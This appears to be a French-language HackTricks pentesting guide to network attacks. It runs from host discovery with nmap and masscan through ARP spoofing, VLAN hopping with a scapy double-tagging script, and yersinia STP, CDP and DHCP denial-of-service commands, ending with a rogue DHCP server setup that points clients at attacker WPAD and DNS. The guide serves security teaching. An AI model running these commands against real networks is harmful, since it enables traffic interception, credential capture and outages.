# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Découverte des hôtes depuis l'extérieur

Ceci va être une **brève section** sur la façon de trouver des **IPs répondant** depuis l'**Internet**.\
Dans cette situation, vous avez un **champ d'IPs** (peut-être même plusieurs **plages**) et vous devez juste trouver **quelles IPs répondent**.

### ICMP

C'est le moyen le plus **facile** et **rapide** de découvrir si un hôte est actif ou non.\
Vous pourriez essayer d'envoyer quelques **paquets ICMP** et **attendre des réponses**. Le moyen le plus simple est d'envoyer une **demande d'écho** et d'attendre la réponse. Vous pouvez le faire en utilisant un simple `ping` ou en utilisant `fping` pour les **plages**.\
Vous pourriez également utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela évitera les filtres pour les demandes-réponses d'écho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Découverte de ports TCP

Il est très courant de constater que tous les types de paquets ICMP sont filtrés. Donc, tout ce que vous pouvez faire pour vérifier si un hôte est actif est **d'essayer de trouver des ports ouverts**. Chaque hôte a **65535 ports**, donc, si vous avez un périmètre "large", vous **ne pouvez pas** tester si **chaque port** de chaque hôte est ouvert ou non, cela prendrait trop de temps.\
Ensuite, ce dont vous avez besoin est un **scanner de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilisés :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez également effectuer cette étape avec `nmap`, mais c'est plus lent et `nmap` a des problèmes pour identifier les hôtes actifs.

### Découverte de port HTTP

Ceci est juste une découverte de port TCP utile lorsque vous souhaitez **vous concentrer sur la découverte des services HTTP** :
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Découverte de port UDP

Vous pourriez également essayer de vérifier si certains **ports UDP sont ouverts** pour décider si vous devriez **porter plus d'attention** à un **hôte.** Comme les services UDP ne **répondent généralement pas** avec **des données** à un paquet de sonde UDP vide, il est difficile de dire si un port est filtré ou ouvert. La façon la plus simple de décider cela est d'envoyer un paquet lié au service en cours d'exécution, et comme vous ne savez pas quel service est en cours d'exécution, vous devriez essayer le plus probable en fonction du numéro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap proposée précédemment testera les **1000 principaux ports UDP** dans chaque hôte à l'intérieur de la plage **/24**, mais même cela prendra **>20min**. Si vous avez besoin de **résultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) : `./udp-proto-scanner.pl 199.66.11.53/24`. Cela enverra ces **probes UDP** à leur **port attendu** (pour une plage /24, cela ne prendra qu'1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Découverte de ports SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ici, vous pouvez trouver un bon guide de toutes les attaques Wifi bien connues au moment de l'écriture :

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Découverte des hôtes de l'intérieur

Si vous êtes à l'intérieur du réseau, l'une des premières choses que vous voudrez faire est de **découvrir d'autres hôtes**. En fonction de **combien de bruit** vous pouvez/voulez faire, différentes actions peuvent être effectuées :

### Passif

Vous pouvez utiliser ces outils pour découvrir passivement des hôtes à l'intérieur d'un réseau connecté :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques commentées dans [_**Découverte des hôtes de l'extérieur**_](#discovering-hosts-from-the-outside) (_Découverte de ports TCP/HTTP/UDP/SCTP_) peuvent également être **appliquées ici**.\
Mais, comme vous êtes sur le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Notez que les techniques commentées dans _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) peuvent également être **appliquées ici**.\
Mais, comme vous êtes sur le **même réseau** que les autres hôtes, vous pouvez faire **plus de choses** :

- Si vous **pinguez** une **adresse de diffusion de sous-réseau**, le ping devrait arriver à **chaque hôte** et ils pourraient **répondre** à **vous** : `ping -b 10.10.5.255`
- En pingant l'**adresse de diffusion du réseau**, vous pourriez même trouver des hôtes à l'intérieur de **d'autres sous-réseaux** : `ping -b 255.255.255.255`
- Utilisez les drapeaux `-PE`, `-PP`, `-PM` de `nmap` pour effectuer la découverte d'hôtes en envoyant respectivement des **ICMPv4 echo**, **timestamp**, et **subnet mask requests** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan est utilisé pour **allumer** des ordinateurs via un **message réseau**. Le paquet magique utilisé pour allumer l'ordinateur est simplement un paquet où un **MAC Dst** est fourni et ensuite il est **répété 16 fois** à l'intérieur du même paquet.\
Ensuite, ce type de paquets est généralement envoyé dans un **ethernet 0x0842** ou dans un **paquet UDP vers le port 9**.\
Si **aucun \[MAC]** n'est fourni, le paquet est envoyé à **la diffusion ethernet** (et le MAC de diffusion sera celui qui est répété).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Analyse des hôtes

Une fois que vous avez découvert tous les IP (externes ou internes) que vous souhaitez analyser en profondeur, différentes actions peuvent être effectuées.

### TCP

- **Port** ouvert : _SYN --> SYN/ACK --> RST_
- **Port** fermé : _SYN --> RST/ACK_
- **Port** filtré : _SYN --> \[AUCUNE RÉPONSE]_
- **Port** filtré : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il y a 2 options pour scanner un port UDP :

- Envoyer un **paquet UDP** et vérifier la réponse _**ICMP unreachable**_ si le port est **fermé** (dans plusieurs cas, ICMP sera **filtré** donc vous ne recevrez aucune information si le port est fermé ou ouvert).
- Envoyer des **datagrammes formatés** pour susciter une réponse d'un **service** (par exemple, DNS, DHCP, TFTP, et d'autres, comme listé dans _nmap-payloads_). Si vous recevez une **réponse**, alors, le port est **ouvert**.

**Nmap** va **mélanger les deux** options en utilisant "-sV" (les scans UDP sont très lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Scan SCTP

**SCTP (Stream Control Transmission Protocol)** est conçu pour être utilisé aux côtés de **TCP (Transmission Control Protocol)** et **UDP (User Datagram Protocol)**. Son principal objectif est de faciliter le transport des données de téléphonie sur les réseaux IP, reflétant de nombreuses fonctionnalités de fiabilité que l'on trouve dans **Signaling System 7 (SS7)**. **SCTP** est un composant central de la famille de protocoles **SIGTRAN**, qui vise à transporter les signaux SS7 sur les réseaux IP.

Le support pour **SCTP** est fourni par divers systèmes d'exploitation, tels que **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** et **VxWorks**, indiquant son large acceptation et son utilité dans le domaine des télécommunications et du réseautage.

Deux scans différents pour SCTP sont offerts par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Évasion des IDS et IPS

{{#ref}}
ids-evasion.md
{{#endref}}

### **Plus d'options nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Révéler les adresses IP internes

**Des routeurs, des pare-feu et des dispositifs réseau mal configurés** répondent parfois aux sondes réseau en utilisant **des adresses source non publiques**. **tcpdump** peut être utilisé pour identifier les paquets reçus d'adresses privées pendant les tests. Plus précisément, sur Kali Linux, les paquets peuvent être capturés sur l'**interface eth2**, qui est accessible depuis Internet public. Il est important de noter que si votre configuration est derrière un NAT ou un pare-feu, de tels paquets seront probablement filtrés.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Avec le sniffing, vous pouvez apprendre des détails sur les plages IP, les tailles de sous-réseau, les adresses MAC et les noms d'hôtes en examinant les trames et paquets capturés. Si le réseau est mal configuré ou si le tissu de commutation est sous pression, les attaquants peuvent capturer des informations sensibles via le sniffing réseau passif.

Si un réseau Ethernet commuté est configuré correctement, vous ne verrez que des trames de diffusion et des matériaux destinés à votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut également capturer des paquets d'une machine distante via une session SSH avec Wireshark comme interface graphique en temps réel.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Évidemment.

### Capturing credentials

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour analyser les identifiants à partir d'un pcap ou d'une interface en direct.

## LAN attacks

### ARP spoofing

L'ARP Spoofing consiste à envoyer des ARPResponses gratuits pour indiquer que l'IP d'une machine a le MAC de notre appareil. Ensuite, la victime changera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'IP usurpée.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Débordement CAM

Débordez la table CAM du commutateur en envoyant beaucoup de paquets avec différentes adresses mac source. Lorsque la table CAM est pleine, le commutateur commence à se comporter comme un hub (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vulnérabilité a été corrigée.

### Attaques 802.1Q VLAN / DTP

#### Trunking Dynamique

Le **Dynamic Trunking Protocol (DTP)** est conçu comme un protocole de couche liaison pour faciliter un système automatique de trunking, permettant aux commutateurs de sélectionner automatiquement les ports pour le mode trunk (Trunk) ou le mode non-trunk. Le déploiement de **DTP** est souvent considéré comme indicatif d'une conception réseau sous-optimale, soulignant l'importance de configurer manuellement les trunks uniquement lorsque cela est nécessaire et d'assurer une documentation appropriée.

Par défaut, les ports des commutateurs sont configurés pour fonctionner en mode Auto Dynamique, ce qui signifie qu'ils sont prêts à initier le trunking si un commutateur voisin le demande. Un problème de sécurité survient lorsqu'un pentester ou un attaquant se connecte au commutateur et envoie une trame DTP Désirable, obligeant le port à entrer en mode trunk. Cette action permet à l'attaquant d'énumérer les VLANs par l'analyse des trames STP et de contourner la segmentation VLAN en configurant des interfaces virtuelles.

La présence de DTP dans de nombreux commutateurs par défaut peut être exploitée par des adversaires pour imiter le comportement d'un commutateur, accédant ainsi au trafic à travers tous les VLANs. Le script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) est utilisé pour surveiller une interface, révélant si un commutateur est en mode Default, Trunk, Dynamique, Auto ou Access—ce dernier étant la seule configuration immunisée contre les attaques de VLAN hopping. Cet outil évalue l'état de vulnérabilité du commutateur.

Si une vulnérabilité réseau est identifiée, l'outil _**Yersinia**_ peut être utilisé pour "activer le trunking" via le protocole DTP, permettant l'observation des paquets de tous les VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Pour énumérer les VLANs, il est également possible de générer le cadre DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Ne pas interrompre le script en aucune circonstance. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de trunk créés dynamiquement sur le switch ne vivent que cinq minutes. Après cinq minutes, le trunk se déconnecte.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je voudrais souligner que **Access/Desirable (0x03)** indique que le cadre DTP est de type Désirable, ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les cadres STP, **nous apprenons l'existence de VLAN 30 et VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLANs spécifiques

Une fois que vous connaissez les ID de VLAN et les valeurs IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN spécifique**.\
Si DHCP n'est pas disponible, utilisez _ifconfig_ pour définir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

L'attaque discutée de **Dynamic Trunking et de la création d'interfaces virtuelles pour découvrir des hôtes à l'intérieur** d'autres VLANs est **automatiquement effectuée** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un attaquant connaît la valeur du **MAC, IP et VLAN ID de l'hôte victime**, il pourrait essayer de **double taguer une trame** avec son VLAN désigné et le VLAN de la victime et envoyer un paquet. Comme la **victime ne pourra pas se connecter** avec l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** à des protocoles qui peuvent effectuer des actions intéressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **scan de port TCP en usurpant une IP contrôlée par l'attaquant et accessible par la victime** (probablement via Internet). Ensuite, l'attaquant pourrait écouter sur le deuxième hôte qui lui appartient s'il reçoit des paquets de la victime.

![](<../../images/image (190).png>)

Pour effectuer cette attaque, vous pourriez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de la segmentation VLAN latérale <a href="#d679" id="d679"></a>

Si vous avez **accès à un switch auquel vous êtes directement connecté**, vous avez la possibilité de **contourner la segmentation VLAN** au sein du réseau. Il suffit de **changer le port en mode trunk** (également connu sous le nom de trunk), de créer des interfaces virtuelles avec les ID des VLAN cibles, et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de manière dynamique (DHCP) ou vous pouvez la configurer statiquement. Cela dépend du cas.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Contournement de VLAN privé de couche 3

Dans certains environnements, tels que les réseaux sans fil pour invités, des paramètres **d'isolation de port (également connus sous le nom de VLAN privé)** sont mis en œuvre pour empêcher les clients connectés à un point d'accès sans fil de communiquer directement entre eux. Cependant, une technique a été identifiée qui peut contourner ces mesures d'isolation. Cette technique exploite soit l'absence de ACL réseau, soit leur configuration incorrecte, permettant aux paquets IP d'être routés à travers un routeur pour atteindre un autre client sur le même réseau.

L'attaque est exécutée en créant un **paquet qui porte l'adresse IP du client de destination mais avec l'adresse MAC du routeur**. Cela amène le routeur à transmettre par erreur le paquet au client cible. Cette approche est similaire à celle utilisée dans les attaques de Double Tagging, où la capacité de contrôler un hôte accessible à la victime est utilisée pour exploiter la faille de sécurité.

**Étapes clés de l'attaque :**

1. **Création d'un paquet :** Un paquet est spécialement conçu pour inclure l'adresse IP du client cible mais avec l'adresse MAC du routeur.
2. **Exploitation du comportement du routeur :** Le paquet conçu est envoyé au routeur, qui, en raison de la configuration, redirige le paquet vers le client cible, contournant l'isolation fournie par les paramètres de VLAN privé.

### Attaques VTP

VTP (VLAN Trunking Protocol) centralise la gestion des VLAN. Il utilise des numéros de révision pour maintenir l'intégrité de la base de données VLAN ; toute modification incrémente ce numéro. Les switches adoptent des configurations avec des numéros de révision plus élevés, mettant à jour leurs propres bases de données VLAN.

#### Rôles du domaine VTP

- **Serveur VTP :** Gère les VLAN—crée, supprime, modifie. Il diffuse des annonces VTP aux membres du domaine.
- **Client VTP :** Reçoit des annonces VTP pour synchroniser sa base de données VLAN. Ce rôle est restreint des modifications de configuration VLAN locales.
- **Transparent VTP :** Ne participe pas aux mises à jour VTP mais transmet les annonces VTP. Non affecté par les attaques VTP, il maintient un numéro de révision constant de zéro.

#### Types d'annonces VTP

- **Annonce de résumé :** Diffusée par le serveur VTP toutes les 300 secondes, portant des informations essentielles sur le domaine.
- **Annonce de sous-ensemble :** Envoyée suite à des modifications de configuration VLAN.
- **Demande d'annonce :** Émise par un client VTP pour demander une annonce de résumé, généralement en réponse à la détection d'un numéro de révision de configuration plus élevé.

Les vulnérabilités VTP sont exploitables exclusivement via des ports trunk, car les annonces VTP circulent uniquement par eux. Les scénarios post-attaque DTP pourraient pivoter vers VTP. Des outils comme Yersinia peuvent faciliter les attaques VTP, visant à effacer la base de données VLAN, perturbant ainsi le réseau.

Note : Cette discussion concerne la version 1 de VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Dans le mode graphique de Yersinia, choisissez l'option de suppression de tous les VLAN VTP pour purger la base de données VLAN.

### Attaques STP

**Si vous ne pouvez pas capturer les trames BPDU sur vos interfaces, il est peu probable que vous réussissiez dans une attaque STP.**

#### **DoS BPDU STP**

En envoyant beaucoup de BPDUs TCP (Notification de changement de topologie) ou Conf (les BPDUs qui sont envoyés lorsque la topologie est créée), les commutateurs sont surchargés et cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque STP TCP**

Lorsqu'un TCP est envoyé, la table CAM des commutateurs sera supprimée en 15s. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera redémarrée en continu (ou toutes les 15 secondes) et lorsqu'elle est redémarrée, le commutateur se comporte comme un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque STP Root**

L'attaquant simule le comportement d'un commutateur pour devenir le root STP du réseau. Ensuite, plus de données passeront par lui. Cela est intéressant lorsque vous êtes connecté à deux commutateurs différents.\
Cela se fait en envoyant des paquets BPDUs CONF indiquant que la valeur de **priorité** est inférieure à la priorité réelle du commutateur root actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connecté à 2 commutateurs, il peut être la racine du nouvel arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera effectuée).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

Le protocole de découverte CISCO (CDP) est essentiel pour la communication entre les appareils CISCO, leur permettant de **s'identifier mutuellement et de partager des détails de configuration**.

#### Collecte de données passive <a href="#id-0e0f" id="id-0e0f"></a>

CDP est configuré pour diffuser des informations à travers tous les ports, ce qui pourrait entraîner un risque de sécurité. Un attaquant, en se connectant à un port de commutateur, pourrait déployer des renifleurs de réseau comme **Wireshark**, **tcpdump** ou **Yersinia**. Cette action peut révéler des données sensibles sur l'appareil réseau, y compris son modèle et la version de Cisco IOS qu'il exécute. L'attaquant pourrait alors cibler des vulnérabilités spécifiques dans la version de Cisco IOS identifiée.

#### Induction d'un débordement de table CDP <a href="#id-0d6a" id="id-0d6a"></a>

Une approche plus agressive consiste à lancer une attaque par déni de service (DoS) en submergeant la mémoire du commutateur, en prétendant être des appareils CISCO légitimes. Ci-dessous se trouve la séquence de commandes pour initier une telle attaque en utilisant Yersinia, un outil réseau conçu pour les tests :
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Lors de cette attaque, le CPU du switch et la table des voisins CDP sont fortement sollicités, ce qui entraîne ce que l'on appelle souvent **“paralysie du réseau”** en raison de la consommation excessive de ressources.

#### Attaque par usurpation de CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez également utiliser [**scapy**](https://github.com/secdev/scapy/). Assurez-vous de l'installer avec le package `scapy/contrib`.

### Attaques VoIP et l'outil VoIP Hopper

Les téléphones VoIP, de plus en plus intégrés aux appareils IoT, offrent des fonctionnalités telles que déverrouiller des portes ou contrôler des thermostats via des numéros de téléphone spéciaux. Cependant, cette intégration peut poser des risques de sécurité.

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) est conçu pour émuler un téléphone VoIP dans divers environnements (Cisco, Avaya, Nortel, Alcatel-Lucent). Il découvre l'ID VLAN du réseau vocal en utilisant des protocoles comme CDP, DHCP, LLDP-MED et 802.1Q ARP.

**VoIP Hopper** propose trois modes pour le Cisco Discovery Protocol (CDP) :

1. **Mode Sniff** (`-c 0`) : Analyse les paquets réseau pour identifier l'ID VLAN.
2. **Mode Spoof** (`-c 1`) : Génère des paquets personnalisés imitant ceux d'un véritable appareil VoIP.
3. **Mode Spoof avec Paquet Pré-fabriqué** (`-c 2`) : Envoie des paquets identiques à ceux d'un modèle spécifique de téléphone IP Cisco.

Le mode préféré pour la vitesse est le troisième. Il nécessite de spécifier :

- L'interface réseau de l'attaquant (`-i` paramètre).
- Le nom de l'appareil VoIP étant émulé (`-E` paramètre), respectant le format de nommage Cisco (par exemple, SEP suivi d'une adresse MAC).

Dans les environnements d'entreprise, pour imiter un appareil VoIP existant, on peut :

- Inspecter l'étiquette MAC sur le téléphone.
- Naviguer dans les paramètres d'affichage du téléphone pour voir les informations sur le modèle.
- Connecter l'appareil VoIP à un ordinateur portable et observer les requêtes CDP à l'aide de Wireshark.

Une commande exemple pour exécuter l'outil en mode trois serait :
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Attaques DHCP

#### Énumération
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Deux types de DoS** peuvent être effectués contre les serveurs DHCP. Le premier consiste à **simuler suffisamment de faux hôtes pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les réponses du serveur DHCP et compléter le protocole (**Discover** (Comp) --> **Offer** (serveur) --> **Request** (Comp) --> **ACK** (serveur)). Par exemple, cela **n'est pas possible dans les réseaux Wifi**.

Une autre façon d'effectuer un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme code source chaque IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une méthode plus automatique pour faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig).

Vous pourriez utiliser les attaques DoS mentionnées pour forcer les clients à obtenir de nouveaux baux dans l'environnement et épuiser les serveurs légitimes afin qu'ils deviennent non réactifs. Ainsi, lorsque les légitimes essaient de se reconnecter, **vous pouvez servir des valeurs malveillantes mentionnées dans l'attaque suivante**.

#### Définir des valeurs malveillantes

Un serveur DHCP malveillant peut être configuré en utilisant le script DHCP situé à `/usr/share/responder/DHCP.py`. Cela est utile pour les attaques réseau, comme la capture du trafic HTTP et des identifiants, en redirigeant le trafic vers un serveur malveillant. Cependant, configurer une passerelle malveillante est moins efficace car cela ne permet que de capturer le trafic sortant du client, manquant les réponses de la véritable passerelle. Au lieu de cela, il est recommandé de configurer un serveur DNS ou WPAD malveillant pour une attaque plus efficace.

Voici les options de commande pour configurer le serveur DHCP malveillant :

- **Notre adresse IP (Annonce de passerelle)** : Utilisez `-i 10.0.0.100` pour annoncer l'adresse IP de votre machine comme passerelle.
- **Nom de domaine DNS local** : En option, utilisez `-d example.org` pour définir un nom de domaine DNS local.
- **Adresse IP du routeur/passerelle d'origine** : Utilisez `-r 10.0.0.1` pour spécifier l'adresse IP du routeur ou de la passerelle légitime.
- **Adresse IP du serveur DNS principal** : Utilisez `-p 10.0.0.100` pour définir l'adresse IP du serveur DNS malveillant que vous contrôlez.
- **Adresse IP du serveur DNS secondaire** : En option, utilisez `-s 10.0.0.1` pour définir une adresse IP de serveur DNS secondaire.
- **Masque de sous-réseau du réseau local** : Utilisez `-n 255.255.255.0` pour définir le masque de sous-réseau pour le réseau local.
- **Interface pour le trafic DHCP** : Utilisez `-I eth1` pour écouter le trafic DHCP sur une interface réseau spécifique.
- **Adresse de configuration WPAD** : Utilisez `-w “http://10.0.0.100/wpad.dat”` pour définir l'adresse de configuration WPAD, aidant à l'interception du trafic web.
- **Usurper l'adresse IP de la passerelle par défaut** : Incluez `-S` pour usurper l'adresse IP de la passerelle par défaut.
- **Répondre à toutes les demandes DHCP** : Incluez `-R` pour faire en sorte que le serveur réponde à toutes les demandes DHCP, mais soyez conscient que cela est bruyant et peut être détecté.

En utilisant correctement ces options, un serveur DHCP malveillant peut être établi pour intercepter efficacement le trafic réseau.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
